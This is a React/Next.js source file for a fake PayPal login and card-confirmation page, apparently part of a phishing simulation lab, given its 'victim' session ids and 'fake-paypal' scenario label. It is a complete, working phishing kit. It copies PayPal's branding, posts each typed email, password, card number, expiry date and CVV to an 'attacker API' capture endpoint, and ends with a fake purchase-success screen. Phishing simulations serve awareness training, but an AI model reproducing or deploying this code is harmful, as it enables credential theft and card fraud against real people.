'use client'

import { useState, useEffect, Suspense } from 'react'
import { Eye, EyeOff } from 'lucide-react'
import { useSearchParams } from 'next/navigation'
import { getAttackerApiUrl } from '@/lib/config'

function FakePayPalContent() {
  const [formData, setFormData] = useState({
    email: '',
    password: '',
    cardNumber: '',
    expiryDate: '',
    cvv: ''
  })
  const [showPassword, setShowPassword] = useState(false)
  const [sessionId, setSessionId] = useState('')
  const [currentStep, setCurrentStep] = useState<'login' | 'verify' | 'loading' | 'success'>('login')
  const [loginAttempts, setLoginAttempts] = useState(0)
  const searchParams = useSearchParams()

  useEffect(() => {
    const urlSessionId = searchParams.get('session')
    const newSessionId = urlSessionId || `victim-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
    setSessionId(newSessionId)
    
    fetch(getAttackerApiUrl('capture'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'victim_connected',
        sessionId: newSessionId,
        data: {
          ip: 'Victim IP Hidden',
          userAgent: navigator.userAgent,
          scenario: 'fake-paypal',
          page: 'login'
        }
      })
    }).catch(console.error)
  }, [searchParams])

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }))
    
    if (value.length > 3 && (value.includes('@') || field === 'password' || field === 'cardNumber')) {
      fetch(getAttackerApiUrl('capture'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'credentials',
          sessionId,
          data: {
            field: `paypal_${field}`,
            value: value
          }
        })
      }).catch(console.error)
    }
  }

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    
    await fetch(getAttackerApiUrl('capture'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'credentials',
        sessionId,
        data: {
          field: 'paypal_login_attempt',
          value: JSON.stringify({
            email: formData.email,
            password: formData.password,
            attempt: loginAttempts + 1
          })
        }
      })
    }).catch(console.error)

    setLoginAttempts(prev => prev + 1)

    if (loginAttempts === 0 && formData.email && formData.password) {
      setCurrentStep('verify')
    } else {
      alert('Sorry, something went wrong. Please try again.')
    }
  }

  const handleCardVerification = async (e: React.FormEvent) => {
    e.preventDefault()
    
    await fetch('http://localhost:3001/api/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'credentials',
        sessionId,
        data: {
          field: 'paypal_card_verification',
          value: JSON.stringify({
            cardNumber: formData.cardNumber,
            expiryDate: formData.expiryDate,
            cvv: formData.cvv
          })
        }
      })
    }).catch(console.error)

    setCurrentStep('loading')
    
    setTimeout(() => {
      setCurrentStep('success')
      
      if (window.opener) {
        window.opener.postMessage({ type: 'paypal_success' }, '*')
      }
      
      setTimeout(() => {
        window.close()
      }, 3000)
    }, 2000)
  }

  if (currentStep === 'success') {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center p-8">
          <div className="w-16 h-16 bg-[#003087] rounded-full flex items-center justify-center mx-auto mb-4">
            <div className="text-white text-2xl">✓</div>
          </div>
          <h2 className="text-2xl font-semibold text-gray-900 mb-2">Payment Successful!</h2>
          <p className="text-gray-600 mb-4">Your purchase has been completed.</p>
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 max-w-md mx-auto">
            <p className="text-sm text-blue-800">
              🎉 Your iPhone 15 Pro will be shipped within 24 hours. Thank you for using PayPal!
            </p>
          </div>
          <p className="text-xs text-gray-500 mt-4">This window will close automatically...</p>
        </div>
      </div>
    )
  }

  if (currentStep === 'loading') {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center p-8">
          <div className="inline-block animate-spin rounded-full h-12 w-12 border-4 border-[#003087] border-t-transparent mb-4"></div>
          <h2 className="text-xl font-semibold text-gray-900 mb-2">Processing Payment...</h2>
          <p className="text-gray-600">Please wait while we verify your information.</p>
        </div>
      </div>
    )
  }

  if (currentStep === 'verify') {
    return (
      <div className="min-h-screen bg-gray-50">
        <div className="max-w-md mx-auto p-6 pt-16">
          <div className="text-center mb-8">
            <svg className="h-10 mx-auto mb-6" viewBox="0 0 124 33" fill="#003087">
              <path d="M46.211 6.749h-6.839a.95.95 0 0 0-.939.802l-2.766 17.537a.57.57 0 0 0 .564.658h3.265a.95.95 0 0 0 .939-.803l.746-4.73a.95.95 0 0 1 .938-.803h2.165c4.505 0 7.105-2.18 7.784-6.5.306-1.89.013-3.375-.872-4.415-.972-1.142-2.696-1.746-4.985-1.746zM47 13.154c-.374 2.454-2.249 2.454-4.062 2.454h-1.032l.724-4.583a.57.57 0 0 1 .563-.481h.473c1.235 0 2.4 0 3.002.704.359.42.469 1.044.332 1.906zM66.654 13.075h-3.275a.57.57 0 0 0-.563.481l-.146.916-.229-.332c-.709-1.029-2.29-1.373-3.868-1.373-3.619 0-6.71 2.741-7.312 6.586-.313 1.918.132 3.752 1.22 5.031.998 1.176 2.426 1.666 4.125 1.666 2.916 0 4.533-1.875 4.533-1.875l-.146.91a.57.57 0 0 0 .562.66h2.95a.95.95 0 0 0 .939-.803l1.77-11.209a.568.568 0 0 0-.56-.658zm-4.565 6.374c-.316 1.871-1.801 3.127-3.695 3.127-.951 0-1.711-.305-2.199-.883-.484-.574-.668-1.391-.514-2.301.295-1.855 1.805-3.152 3.67-3.152.93 0 1.686.309 2.184.892.499.589.697 1.411.554 2.317zM84.096 13.075h-3.291a.954.954 0 0 0-.787.417l-4.539 6.686-1.924-6.425a.953.953 0 0 0-.912-.678h-3.234a.57.57 0 0 0-.541.754l3.625 10.638-3.408 4.811a.57.57 0 0 0 .465.9h3.287a.949.949 0 0 0 .781-.408l10.946-15.8a.57.57 0 0 0-.468-.895z"/>
            </svg>
          </div>

          <div className="bg-white rounded-lg shadow-sm p-6">
            <div className="text-center mb-6">
              <h1 className="text-xl font-normal text-gray-900 mb-2">Confirm your payment</h1>
              <p className="text-gray-600">For security, please confirm your card details for this $359.99 purchase.</p>
            </div>

            <form onSubmit={handleCardVerification} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Card Number
                </label>
                <input
                  type="text"
                  placeholder="1234 5678 1234 5678"
                  value={formData.cardNumber}
                  onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  required
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Expiry Date
                  </label>
                  <input
                    type="text"
                    placeholder="MM/YY"
                    value={formData.expiryDate}
                    onChange={(e) => handleInputChange('expiryDate', e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    CVV
                  </label>
                  <input
                    type="text"
                    placeholder="123"
                    value={formData.cvv}
                    onChange={(e) => handleInputChange('cvv', e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    required
                  />
                </div>
              </div>

              <button
                type="submit"
                className="w-full bg-[#ffc439] text-[#003087] py-3 rounded-lg font-bold hover:bg-[#f0b90b] transition-colors"
              >
                Complete Purchase - $359.99
              </button>
            </form>

            <p className="text-xs text-gray-500 text-center mt-4">
              By continuing, you agree to PayPal's Terms and Privacy Policy.
            </p>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <div className="max-w-md mx-auto p-6 pt-16">
        <div className="text-center mb-8">
          <svg className="h-10 mx-auto mb-6" viewBox="0 0 124 33" fill="#003087">
            <path d="M46.211 6.749h-6.839a.95.95 0 0 0-.939.802l-2.766 17.537a.57.57 0 0 0 .564.658h3.265a.95.95 0 0 0 .939-.803l.746-4.73a.95.95 0 0 1 .938-.803h2.165c4.505 0 7.105-2.18 7.784-6.5.306-1.89.013-3.375-.872-4.415-.972-1.142-2.696-1.746-4.985-1.746zM47 13.154c-.374 2.454-2.249 2.454-4.062 2.454h-1.032l.724-4.583a.57.57 0 0 1 .563-.481h.473c1.235 0 2.4 0 3.002.704.359.42.469 1.044.332 1.906zM66.654 13.075h-3.275a.57.57 0 0 0-.563.481l-.146.916-.229-.332c-.709-1.029-2.29-1.373-3.868-1.373-3.619 0-6.71 2.741-7.312 6.586-.313 1.918.132 3.752 1.22 5.031.998 1.176 2.426 1.666 4.125 1.666 2.916 0 4.533-1.875 4.533-1.875l-.146.91a.57.57 0 0 0 .562.66h2.95a.95.95 0 0 0 .939-.803l1.77-11.209a.568.568 0 0 0-.56-.658zm-4.565 6.374c-.316 1.871-1.801 3.127-3.695 3.127-.951 0-1.711-.305-2.199-.883-.484-.574-.668-1.391-.514-2.301.295-1.855 1.805-3.152 3.67-3.152.93 0 1.686.309 2.184.892.499.589.697 1.411.554 2.317zM84.096 13.075h-3.291a.954.954 0 0 0-.787.417l-4.539 6.686-1.924-6.425a.953.953 0 0 0-.912-.678h-3.234a.57.57 0 0 0-.541.754l3.625 10.638-3.408 4.811a.57.57 0 0 0 .465.9h3.287a.949.949 0 0 0 .781-.408l10.946-15.8a.57.57 0 0 0-.468-.895z"/>
          </svg>
        </div>

        <div className="bg-white rounded-lg shadow-sm p-6">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-normal text-gray-900 mb-2">Log in to your account</h1>
          </div>

          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <input
                type="email"
                placeholder="Email address or phone number"
                value={formData.email}
                onChange={(e) => handleInputChange('email', e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                required
              />
            </div>

            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Password"
                value={formData.password}
                onChange={(e) => handleInputChange('password', e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent pr-12"
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-3.5 text-gray-400 hover:text-gray-600"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>

            <button
              type="submit"
              className="w-full bg-[#003087] text-white py-3 rounded-lg font-semibold hover:bg-[#002064] transition-colors"
            >
              Log In
            </button>
          </form>

          <div className="text-center mt-6">
            <a href="#" className="text-[#003087] text-sm hover:underline">
              Having trouble logging in?
            </a>
          </div>

          <div className="flex items-center my-6">
            <div className="flex-1 border-t border-gray-300"></div>
            <span className="px-4 text-gray-500 text-sm">or</span>
            <div className="flex-1 border-t border-gray-300"></div>
          </div>

          <button className="w-full bg-[#ffc439] text-[#003087] py-3 rounded-lg font-semibold hover:bg-[#f0b90b] transition-colors">
            Sign Up
          </button>

          <div className="text-center mt-8">
            <p className="text-xs text-gray-500">
              By continuing, you agree to PayPal's User Agreement and Privacy Policy.
            </p>
          </div>
        </div>
      </div>

      {/* Debug info */}
      {sessionId && (
        <div className="fixed bottom-4 right-4 bg-black/80 text-white text-xs p-2 rounded opacity-0 hover:opacity-100 transition-opacity">
          <div>Scenario: Fake PayPal</div>
          <div>Session: {sessionId}</div>
          <div>Step: {currentStep}</div>
          <div>Attempts: {loginAttempts}</div>
          <div>Data: {formData.email ? 'Email ✓' : ''} {formData.password ? 'Pass ✓' : ''}</div>
        </div>
      )}
    </div>
  )
}

export default function FakePayPal() {
  return (
    <Suspense fallback={<div className="min-h-screen bg-gray-50 flex items-center justify-center">
      <div className="text-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#003087] mx-auto"></div>
        <p className="mt-4 text-gray-600">Loading PayPal...</p>
      </div>
    </div>}>
      <FakePayPalContent />
    </Suspense>
  )
}